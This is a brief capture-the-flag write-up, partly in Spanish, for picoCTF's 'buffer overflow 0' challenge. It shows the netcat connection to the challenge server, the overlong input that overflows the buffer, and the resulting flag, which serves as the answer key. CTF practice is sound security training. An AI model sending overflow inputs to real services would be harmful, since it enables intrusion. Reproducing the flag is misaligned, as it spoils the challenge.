# buffer overflow 0

## Objetivo

Smash the stack
Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c). And connect with it using:
nc saturn.picoctf.net 51532

## Solución

```bash
hone@unidad03:~/Documentos/Materias/Seguridad_Redes_Sistemas/problemas-hacking/picoCTF/binary_explotation/2022/buffer_overflow_0$ nc saturn.picoctf.net 51532
Input:
```

```
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}
```

Bandera: *picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}*

## Referencias
